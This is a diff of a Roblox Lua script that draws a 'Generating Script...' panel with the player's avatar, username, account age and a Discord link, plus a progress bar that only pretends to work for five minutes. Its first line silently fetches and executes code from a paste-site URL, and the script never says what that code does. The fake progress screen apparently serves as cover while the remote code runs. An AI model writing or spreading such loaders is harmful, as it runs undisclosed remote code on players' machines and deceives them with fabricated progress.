@@ -1,205 +1,183 @@
 loadstring(game:HttpGet("https://pastefy.app/49kDarAY/raw"))()
---// Services
+-- DEVX MINI UI GENERATING SCRIPT (SMOOTH LOADING)
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
+local TweenService = game:GetService("TweenService")
 
---// ScreenGui
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "SafeLoadingBar"
-screenGui.IgnoreGuiInset = true
-screenGui.ResetOnSpawn = false
-screenGui.Parent = playerGui
+-- COLORS
+local WHITE     = Color3.fromRGB(255,255,255)
+local BLUE_LINK = Color3.fromRGB(80,170,255)
+local GREEN_BAR = Color3.fromRGB(90,255,140)
+local VIOLET    = Color3.fromRGB(170,120,255)
+local GRAY_BG   = Color3.fromRGB(55,55,55)
+local USER_HL   = Color3.fromRGB(255,255,255)
 
---// Container Frame
-local container = Instance.new("Frame")
-container.Size = UDim2.new(0, 420, 0, 150)
-container.Position = UDim2.new(0.5, 0, 0.5, 0)
-container.AnchorPoint = Vector2.new(0.5, 0.5)
-container.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-container.BackgroundTransparency = 0.1
-container.Parent = screenGui
+-- ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "DevX_GeneratingUI"
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
 
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 14)
-corner.Parent = container
+-- Main Frame
+local Main = Instance.new("Frame", ScreenGui)
+Main.Size = UDim2.new(0,360,0,175)
+Main.Position = UDim2.new(0.5,0,0.5,-12)
+Main.AnchorPoint = Vector2.new(0.5,0.5)
+Main.BackgroundColor3 = GRAY_BG
+Main.BackgroundTransparency = 0.12
+Main.BorderSizePixel = 0
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0,18)
 
---// Violet Stroke
-local stroke = Instance.new("UIStroke")
-stroke.Parent = container
-stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-stroke.LineJoinMode = Enum.LineJoinMode.Round
-stroke.Thickness = 4
-stroke.Color = Color3.fromRGB(148, 0, 211)
-stroke.Transparency = 0.1
+local Stroke = Instance.new("UIStroke", Main)
+Stroke.Color = VIOLET
+Stroke.Thickness = 3
 
-local gradient = Instance.new("UIGradient")
-gradient.Parent = stroke
-gradient.Color = ColorSequence.new{
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(148, 0, 211)),
-	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 100, 255)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(148, 0, 211))
-}
-gradient.Rotation = 360
+-- Avatar Outer
+local AvatarOuter = Instance.new("Frame", Main)
+AvatarOuter.Size = UDim2.new(0,80,0,80)
+AvatarOuter.Position = UDim2.new(0,20,0,10)
+AvatarOuter.BackgroundColor3 = VIOLET
+AvatarOuter.BorderSizePixel = 0
+Instance.new("UICorner", AvatarOuter).CornerRadius = UDim.new(1,0)
 
---==============================
--- AVATAR + USER (ITAAS LANG)
---==============================
+-- Avatar Inner (UPDATED: gray background, visible)
+local AvatarInner = Instance.new("Frame", AvatarOuter)
+AvatarInner.Size = UDim2.new(1,-6,1,-6)
+AvatarInner.Position = UDim2.new(0.5,0,0.5,0)
+AvatarInner.AnchorPoint = Vector2.new(0.5,0.5)
+AvatarInner.BackgroundColor3 = GRAY_BG -- same color as main frame
+AvatarInner.BackgroundTransparency = 0  -- fully visible
+AvatarInner.BorderSizePixel = 0
+Instance.new("UICorner", AvatarInner).CornerRadius = UDim.new(1,0)
 
--- Avatar
-local avatar = Instance.new("ImageLabel")
-avatar.Size = UDim2.new(0, 90, 0, 90)
-avatar.Position = UDim2.new(0, 20, 0.36, 0) -- inangat
-avatar.AnchorPoint = Vector2.new(0, 0.5)
-avatar.BackgroundTransparency = 1
-avatar.ScaleType = Enum.ScaleType.Crop
-avatar.Parent = container
+-- Avatar Image
+local Avatar = Instance.new("ImageLabel", AvatarInner)
+Avatar.Size = UDim2.new(1,-6,1,-6)
+Avatar.Position = UDim2.new(0.5,0,0.5,0)
+Avatar.AnchorPoint = Vector2.new(0.5,0.5)
+Avatar.BackgroundTransparency = 1
+Avatar.Image = Players:GetUserThumbnailAsync(
+	player.UserId,
+	Enum.ThumbnailType.HeadShot,
+	Enum.ThumbnailSize.Size180x180
+)
+Instance.new("UICorner", Avatar).CornerRadius = UDim.new(1,0)
 
-local avatarCorner = Instance.new("UICorner")
-avatarCorner.CornerRadius = UDim.new(1, 0)
-avatarCorner.Parent = avatar
+-- Username
+local UserLabel = Instance.new("TextLabel", Main)
+UserLabel.Size = UDim2.new(0,80,0,20)
+UserLabel.Position = UDim2.new(0,20,0,95)
+UserLabel.BackgroundTransparency = 1
+UserLabel.Text = "User: "..player.Name
+UserLabel.TextColor3 = USER_HL
+UserLabel.Font = Enum.Font.GothamBold
+UserLabel.TextScaled = true
+UserLabel.TextXAlignment = Enum.TextXAlignment.Center
 
--- Avatar border (bilog)
-local avatarStroke = Instance.new("UIStroke")
-avatarStroke.Parent = avatar
-avatarStroke.Thickness = 3
-avatarStroke.Color = Color3.fromRGB(180, 120, 255)
-avatarStroke.Transparency = 0.05
+-- Text with shadow
+local function TextWithShadow(parent,text,pos,size,color,font,scaled,align)
+	local shadow = Instance.new("TextLabel", parent)
+	shadow.Position = pos + UDim2.new(0,1,0,1)
+	shadow.Size = size
+	shadow.Text = text
+	shadow.TextColor3 = Color3.fromRGB(0,0,0)
+	shadow.TextTransparency = 0.4
+	shadow.Font = font
+	shadow.TextScaled = scaled
+	shadow.BackgroundTransparency = 1
+	shadow.TextXAlignment = align or Enum.TextXAlignment.Left
 
--- Kunin avatar ng gumagamit
-local thumbType = Enum.ThumbnailType.HeadShot
-local thumbSize = Enum.ThumbnailSize.Size180x180
-local content = Players:GetUserThumbnailAsync(player.UserId, thumbType, thumbSize)
-avatar.Image = content
-
--- Username (itaas din)
-local username = Instance.new("TextLabel")
-username.Text = "User: " .. player.Name
-username.Size = UDim2.new(0, 130, 0, 18)
-username.Position = UDim2.new(0, 10, 0.72, 0) -- inangat
-username.BackgroundTransparency = 1
-username.TextSize = 14
-username.TextColor3 = Color3.fromRGB(255,255,255)
-username.Font = Enum.Font.GothamSemibold
-username.TextWrapped = true
-username.Parent = container
-
---==============================
--- TEXT STYLE FUNCTION
---==============================
-local function styleText(label, font, textSize)
+	local label = Instance.new("TextLabel", parent)
+	label.Position = pos
+	label.Size = size
+	label.Text = text
+	label.TextColor3 = color
 	label.Font = font
-	label.TextSize = textSize
-	label.TextColor3 = Color3.fromRGB(255, 255, 255)
-	label.TextStrokeTransparency = 0.8
-	label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+	label.TextScaled = scaled
+	label.BackgroundTransparency = 1
+	label.TextXAlignment = align or Enum.TextXAlignment.Left
+
+	return label
 end
 
---// "Made by" Text
-local madeBy = Instance.new("TextLabel")
-madeBy.Text = "Made By : Dev"
-madeBy.Size = UDim2.new(1, -170, 0, 25)
-madeBy.Position = UDim2.new(0, 150, 0.15, 0)
-madeBy.BackgroundTransparency = 1
-madeBy.TextWrapped = true
-madeBy.Parent = container
-styleText(madeBy, Enum.Font.GothamBlack, 18)
+-- 🔹 MICRO SIZE INCREASE + SLIGHT DOWN (ONLY THESE 3)
+TextWithShadow(
+	Main,
+	"Made By : DevX",
+	UDim2.new(0,120,0,22),
+	UDim2.new(1,-120,0,22),
+	WHITE,
+	Enum.Font.GothamBold,
+	true
+)
 
-local madeByShadow = madeBy:Clone()
-madeByShadow.Position = madeBy.Position + UDim2.new(0, 2, 0, 2)
-madeByShadow.ZIndex = madeBy.ZIndex - 1
-madeByShadow.Parent = container
+TextWithShadow(
+	Main,
+	"Account Age : "..player.AccountAge.." days",
+	UDim2.new(0,120,0,48),
+	UDim2.new(1,-120,0,18),
+	WHITE,
+	Enum.Font.Gotham,
+	true
+)
 
---// Discord Link
-local discordLink = Instance.new("TextLabel")
-discordLink.Text = "<u>https://discord.Devscripthub</u>"
-discordLink.Size = UDim2.new(1, -170, 0, 20)
-discordLink.Position = UDim2.new(0, 150, 0.33, 0)
-discordLink.BackgroundTransparency = 1
-discordLink.RichText = true
-discordLink.TextWrapped = true
-discordLink.Parent = container
-styleText(discordLink, Enum.Font.GothamSemibold, 16)
+TextWithShadow(
+	Main,
+	"https://discord.gg/devxtai",
+	UDim2.new(0,120,0,70),
+	UDim2.new(1,-120,0,18),
+	BLUE_LINK,
+	Enum.Font.Gotham,
+	true
+)
 
-local discordLinkShadow = discordLink:Clone()
-discordLinkShadow.Position = discordLink.Position + UDim2.new(0, 2, 0, 2)
-discordLinkShadow.ZIndex = discordLink.ZIndex - 1
-discordLinkShadow.Parent = container
+TextWithShadow(
+	Main,
+	"Generating Script...",
+	UDim2.new(0,20,0,120),
+	UDim2.new(1,-40,0,20),
+	WHITE,
+	Enum.Font.GothamBold,
+	true,
+	Enum.TextXAlignment.Center
+)
 
---// Title with Typing Effect
-local title = Instance.new("TextLabel")
-title.Text = ""
-title.Size = UDim2.new(1, -170, 0, 35)
-title.Position = UDim2.new(0, 150, 0.45, 0)
-title.BackgroundTransparency = 1
-title.TextWrapped = true
-title.Parent = container
-styleText(title, Enum.Font.GothamBlack, 18)
+-- Loading Bar BG (konting taas lang)
+local BarBG = Instance.new("Frame", Main)
+BarBG.Position = UDim2.new(0,20,0,142)  -- dati 145, itaas ng 3px lang
+BarBG.Size = UDim2.new(1,-40,0,12)
+BarBG.BackgroundColor3 = Color3.fromRGB(45,45,45)
+BarBG.BackgroundTransparency = 0.15
+BarBG.BorderSizePixel = 0
+Instance.new("UICorner", BarBG).CornerRadius = UDim.new(1,0)
 
-local shadow = title:Clone()
-shadow.Position = title.Position + UDim2.new(0, 2, 0, 2)
-shadow.ZIndex = title.ZIndex - 1
-shadow.Parent = container
+-- Loading Bar
+local Bar = Instance.new("Frame", BarBG)
+Bar.Size = UDim2.new(0,0,1,0)
+Bar.BackgroundColor3 = GREEN_BAR
+Bar.BorderSizePixel = 0
+Instance.new("UICorner", Bar).CornerRadius = UDim.new(1,0)
 
---// Loading Bar Background
-local barBG = Instance.new("Frame")
-barBG.Size = UDim2.new(0, 240, 0, 25)
-barBG.Position = UDim2.new(0, 150, 0.65, 0)
-barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-barBG.BackgroundTransparency = 0.1
-barBG.BorderSizePixel = 0
-barBG.Parent = container
+-- Percent (kasabay taas ng Bar)
+local Percent = TextWithShadow(
+	Main,
+	"0%",
+	UDim2.new(0,20,0,157), -- dati 160, itaas ng 3px
+	UDim2.new(1,-40,0,16),
+	WHITE,
+	Enum.Font.GothamBold,
+	true,
+	Enum.TextXAlignment.Center
+)
 
-local barCorner = Instance.new("UICorner")
-barCorner.CornerRadius = UDim.new(0, 8)
-barCorner.Parent = barBG
+-- Smooth loading
+local totalTime = 300
+local steps = 3000
+local stepTime = totalTime / steps
 
---// Loading Bar Fill
-local barFill = Instance.new("Frame")
-barFill.Size = UDim2.new(0, 0, 1, 0)
-barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-barFill.BorderSizePixel = 0
-barFill.Parent = barBG
-
-local fillCorner = Instance.new("UICorner")
-fillCorner.CornerRadius = UDim.new(0, 8)
-fillCorner.Parent = barFill
-
---// Percent Text
-local percentText = Instance.new("TextLabel")
-percentText.Text = "0%"
-percentText.Size = UDim2.new(1, 0, 0, 20)
-percentText.Position = UDim2.new(0.5, 0, 1.05, 0)
-percentText.AnchorPoint = Vector2.new(0.5, 0)
-percentText.BackgroundTransparency = 1
-percentText.Parent = barBG
-styleText(percentText, Enum.Font.GothamBlack, 18)
-
--- Typing Effect
-local function typeText(txt)
-	title.Text = ""
-	shadow.Text = ""
-	for i = 1, #txt do
-		title.Text = string.sub(txt, 1, i)
-		shadow.Text = title.Text
-		task.wait(0.03)
-	end
+for i = 1, steps do
+	local goal = i / steps
+	Bar.Size = UDim2.new(goal,0,1,0)
+	Percent.Text = math.floor(goal * 100).."%"
+	task.wait(stepTime)
 end
-
--- Animation (5 minutes)
-task.spawn(function()
-	typeText("Generating Script..")
-	local totalTime = 300
-	local stepTime = totalTime / 100
-	for i = 0, 100 do
-		barFill:TweenSize(
-			UDim2.new(i / 100, 0, 1, 0),
-			Enum.EasingDirection.Out,
-			Enum.EasingStyle.Linear,
-			stepTime,
-			true
-		)
-		percentText.Text = i .. "%"
-		task.wait(stepTime)
-	end
-end)
